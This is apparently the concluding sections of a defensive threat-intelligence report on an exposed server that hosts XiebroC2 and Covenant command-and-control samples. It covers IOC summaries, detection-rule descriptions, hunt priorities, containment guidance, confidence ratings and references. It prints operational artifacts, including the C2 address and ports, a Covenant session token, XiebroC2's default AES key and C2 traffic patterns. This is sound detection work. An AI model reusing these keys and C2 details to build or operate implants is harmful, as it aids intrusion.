- **5 Sigma rules:** ETW AssemblyLoad in non-.NET processes; process hollowing API sequence; CreateRemoteThread injection sequence; Covenant HTTP POST pattern; PowerShell Base64+Deflate pattern
- **3 Suricata rules:** XiebroC2 TCP C2 traffic; Covenant HTTP POST pattern; HTTP on port 443 (cleartext anomaly)

MITRE ATT&CK techniques covered: T1055.012, T1055, T1620, T1059.001, T1059.003, T1071.001, T1573.001, T1036, T1106, T1140, T1027, T1571, T1070.004

## 9.2 IOC Feed

Structured IOCs in machine-readable JSON format:

**[ioc-feeds/opendirectory-193-56-255-154-20260403-iocs.json](/ioc-feeds/opendirectory-193-56-255-154-20260403-iocs.json)**

IOC summary:
- **3 IPv4 network indicators** (193.56.255.154 on ports 80, 443, 4444)
- **4 file hashes (MD5)** — GruntHTTP.exe, GruntHTTP.ps1, extracted payload, s.d
- **3 file hashes (SHA1)** — GruntHTTP.exe, GruntHTTP.ps1, s.d
- **4 file hashes (SHA256)** — GruntHTTP.exe, GruntHTTP.ps1, extracted payload, s.d (main.exe SHA256 not captured; see data gap note)
- **3 C2 URLs** — Covenant staging paths
- **1 User-Agent string** — hardcoded Chrome 41 UA
- **5 behavioral/network patterns** — Covenant POST pattern, XiebroC2 TCP wire pattern, HTTP-on-443 anomaly
- **3 cryptographic artifacts** — XiebroC2 AES-128-ECB key, Covenant pre-shared AES-256 keys (both builds)
- **6 build artifacts** — session token, build ID, GUID prefixes, compile path, campaign tag, version typo string

## 9.3 Priority Hunt Targets

For organizations hunting proactively or investigating a potential exposure:

**Priority 1 — Highest value, lowest false positive risk:**
- Covenant session token in HTTP POST body: `session=75db-99b1-25fe4e9afbe58696-320bea73` — this string appears in every POST from either stager build; presence in proxy logs confirms Covenant activity from this specific listener configuration
- XiebroC2 AES key string in file scans: `QWERt_CSDMAHUATW` — presence in any binary identifies an XiebroC2 build using the default framework key

**Priority 2 — Infrastructure blocking:**
- Block `193.56.255.154` across ports 80, 443, and 4444 at perimeter
- Hostname `WIN-RCH83RTDA5G` in WinRM authentication and DNS monitoring

**Priority 3 — Behavioral indicators:**
- ETW `DotNETRuntime` AssemblyLoad Event ID 152 from a non-.NET host process (catches both go-clr and Covenant stager payload delivery)
- `main.exe` loading `mscoree.dll` or `clr.dll` (Sysmon Event ID 7) — definitively anomalous for a Go binary
- HTTP on port 443 without TLS (protocol inspection) to `193.56.255.154`
- Chrome 41 User-Agent (`Chrome/41.0.2228.0`) in proxy logs — extremely rare on modern networks

**Priority 4 — Static detection:**
- XiebroC2 pclntab typo string: `main/Helper/sysinfo.WindosVersion` — unique to XiebroC2 3.1
- Space-padded C2 config: `193.56.255.154` followed by 26 spaces in a PE file
- Covenant GruntStager namespace strings: `GruntStager`, `CovenantCertHash`, `UseCertPinning`, `ExecuteStager`

---

# 10. Response Orientation

This section is a brief orientation for readers who need to understand what to address, not a step-by-step incident response guide. Organizations with confirmed infections should engage their internal incident response team or a dedicated playbook.

**Detection priorities (highest-value hunt targets first):**
- Network connections to `193.56.255.154` on ports 4444, 443, or 80 — any confirmed connection represents exposure
- HTTP POST body containing `session=75db-99b1-25fe4e9afbe58696-320bea73` — catches both Covenant stager builds simultaneously
- ETW `DotNETRuntime` AssemblyLoad (Event ID 152) from non-.NET host processes — covers fileless .NET execution regardless of disk artifacts

**Persistence targets — what to look for:**
- No native persistence mechanism was confirmed in static analysis for any of the three active samples; XiebroC2 maintains access via reconnect loop only (no registry run keys, scheduled tasks, or services created by the implant itself)
- `main.exe` binary on disk if present — no standard drop path confirmed; search by filename and by YARA signature
- Any scheduled tasks, registry run keys, or services created via operator-dropped payloads through the `UploadFile` + shell execution capability

**Containment categories:**
- Isolate endpoints with confirmed connections to 193.56.255.154
- Block 193.56.255.154 at perimeter across ports 80, 443, and 4444
- Rotate credentials on any host where these samples executed, prioritizing accounts with elevated privileges
- Review proxy logs for Covenant HTTP POST patterns and Chrome 41 User-Agent anomalies
- Deploy YARA and Sigma signatures from the detection file to endpoint and SIEM platforms

---

# 11. Confidence Levels Summary

### DEFINITE (Direct Evidence — No Ambiguity)
- XiebroC2 v3.1 family identification (compile path in pclntab)
- AES-128-ECB key `QWERt_CSDMAHUATW` (extracted from binary static data)
- Covenant framework identification (GruntStager namespace and class names)
- Pre-shared AES-256 keys for both Covenant builds (extracted from binaries)
- Session token `75db-99b1-25fe4e9afbe58696-320bea73` (shared across both Covenant builds)
- Build ID `a19ea23062db990386a3a478cb89d52e` (POST i= parameter)
- All SHA256 hashes for GruntHTTP.exe, GruntHTTP.ps1, extracted payload, s.d
- Operating system of C2 server: Windows Server 2025 build 10.0.26100 (WinRM NTLM banner)

### HIGH (Strong Evidence, Minor Gaps)
- All 24 MITRE ATT&CK technique mappings (code present, directly observed API sequences)
- Operator compile path `C:/Users/admin/Desktop/code/XiebroC2-3.1/` (pclntab artifact)
- Campaign tag `vps` (static binary data)
- GUID prefixes for both Covenant builds (static binary extraction)
- GBK-to-UTF8 conversion as Chinese-language operator environment indicator (code confirmed; nationality cannot be inferred)
- 36-command capability set (static command dispatch analysis)
- Covenant default HTTP profile fingerprints (code confirmed present in both builds)
- XiebroC2 typo string `WindosVersion` as version-specific detection artifact
- ASN/geolocation for 193.56.255.154: AS9009/M247/Singapore (3 independent sources agree)

### MODERATE (Reasonable Evidence, Notable Gaps)
- Same-operator hypothesis linking 193.56.255.154 and 92.60.75.103 (operational pattern match; no cryptographic or certificate-level confirmation)
- UTA-2026-002 as a distinct trackable operator (72% confidence; three distinguishing characteristics identified)
- Operator profile: individual or very small team, Chinese-language environment, intermediate sophistication
- SOCKS5 lateral movement risk (capability confirmed in code; no active session observed)

### LOW (Weak or Circumstantial Evidence)
- 2023 phishing and 2026 C2 activities operated by the same entity (same IP; three-year gap; no confirmed linking artifacts)
- `github.com/Iamem` as the operator's development account (account exists; 0 public repos; linkage not confirmed)

### INSUFFICIENT (Cannot Assess)
- Attribution to any named threat actor (APT28, APT41, or any other group)
- Main.exe SHA256 hash (not captured in triage artifacts)
- Full Grunt payload capabilities (stager only analyzed; full Grunt requires live server interaction)
- Victim targeting profile (no victims identified in available evidence)

---

# 12. Appendices

## Appendix A — Evidence Data Gap Note

**main.exe SHA256 hash:** The triage preprocessing log was confirmed to have been run against `s.d` only (SHA256 match confirmed in `hashes.txt`). The SHA256 for `main.exe` (XiebroC2 implant) was not captured in the triage artifacts available to this analysis. This hash is documented as absent from the IOC feed with a data gap note. Organizations retrieving this file should compute its SHA256 independently. Presence of the space-padded C2 config strings and pclntab typo `WindosVersion` in a binary is sufficient for YARA-based identification without the hash.

## Appendix B — XiebroC2 v3.1 AES Key: Framework Default Confirmation

The AES-128-ECB key `QWERt_CSDMAHUATW` was independently documented by AhnLab ASEC in their September 2025 analysis of XiebroC2 campaigns targeting exposed MS-SQL servers [AhnLab ASEC, Tier 2: https://asec.ahnlab.com/en/90369/]. The ASEC sample connected to a different IP (`1.94.185.235:8433`) using WebSocket transport, while this investigation's sample uses `193.56.255.154:4444` with TCP transport — confirming these are different deployments using the same framework default key.

**Implication for threat hunting:** The key `QWERt_CSDMAHUATW` can serve as a detection string for any XiebroC2 deployment that uses the default key configuration, not just this specific campaign. The AhnLab ASEC Q4 2025 MS-SQL statistics report confirms XiebroC2 remained active through the end of 2025 [https://asec.ahnlab.com/en/92003/].

## Appendix C — Covenant Framework Historical Adoption Context

Covenant's archived status (original repository archived 2021/2022) did not reduce its threat actor adoption. Key documented actor usage:

- **APT28 (documented, different variant):** Since 2023, APT28 has incorporated a heavily modified Covenant variant with cloud-based C2 routing. The stock default-profile Covenant in this investigation is explicitly inconsistent with APT28's documented variant [Source: The Hacker News citing ESET — https://thehackernews.com/2026/03/apt28-uses-beardshell-and-covenant.html].
- **XiebroC2 crimeware campaigns (documented):** AhnLab ASEC documented XiebroC2 in credential brute-force campaigns against exposed MS-SQL servers [Source: ASEC — https://asec.ahnlab.com/en/90369/; https://asec.ahnlab.com/en/90572/].
- **go-clr library:** The `github.com/Ne0nd0g/go-clr` library vendored in `main.exe` was developed by security researcher Russel Van Tuyl (Ne0nd0g) and is documented at [https://github.com/Ne0nd0g/go-clr].

## Appendix D — Research References

**XiebroC2:**
- **AhnLab ASEC (2025):** "XiebroC2 Being Distributed in Attacks Against MS-SQL Servers" — https://asec.ahnlab.com/en/90369/
- **AhnLab ASEC (2025):** "Coin Miner and XiebroC2 Targeting MS-SQL Servers" — https://asec.ahnlab.com/en/90572/
- **AhnLab ASEC Q4 2025:** MS-SQL malware statistics confirming ongoing XiebroC2 activity — https://asec.ahnlab.com/en/92003/
- **INotGreen/XiebroC2 GitHub repository:** https://github.com/INotGreen/XiebroC2

**Covenant C2:**
- **BleepingComputer:** "APT28 hackers deploy customized variant of Covenant open-source tool" — https://www.bleepingcomputer.com/news/security/apt28-hackers-deploy-customized-variant-of-covenant-open-source-tool/
- **The Hacker News (citing ESET, 2026):** "APT28 Uses BEARDSHELL and Covenant" — https://thehackernews.com/2026/03/apt28-uses-beardshell-and-covenant.html
- **cobbr/Covenant GitHub repository (archived):** https://github.com/cobbr/Covenant

**Infrastructure and Hosting:**
- **HYAS Threat Intel (May 2024):** M247 infrastructure malware hosting documentation — https://www.hyas.com/blog/hyas-threat-intel-report-may-202024
- **IPinfo.io AS9009:** M247 network block data — https://ipinfo.io/AS9009/193.56.255.0/24
- **ThreatFox AS9009:** https://threatfox.abuse.ch/asn/9009/

**Open Directory and Multi-C2 Staging:**
- **hunt.io:** "Exposed BYOB C2 Infrastructure" — https://hunt.io/blog/exposed-byob-c2-infrastructure-multi-stage-malware-deployment
- **hunt.io:** "TeamPCP Multi-C2 Open Directory Analysis" — https://hunt.io/blog/33k-exposed-litellm-teampcp-c2-supply-chain-attack

**Detection Libraries:**
- **Ne0nd0g/go-clr:** https://github.com/Ne0nd0g/go-clr
- **EmergingThreats XiebroC2 Ruleset:** ET TROJAN XiebroC2 CnC Activity (KeepAlive, SendInfo, List Process)

---

## License
© 2026 Joseph. All rights reserved.
See LICENSE for terms.
